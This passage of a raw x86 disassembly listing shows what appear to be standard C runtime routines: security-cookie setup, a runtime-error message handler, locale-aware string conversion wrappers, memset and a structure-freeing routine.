  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
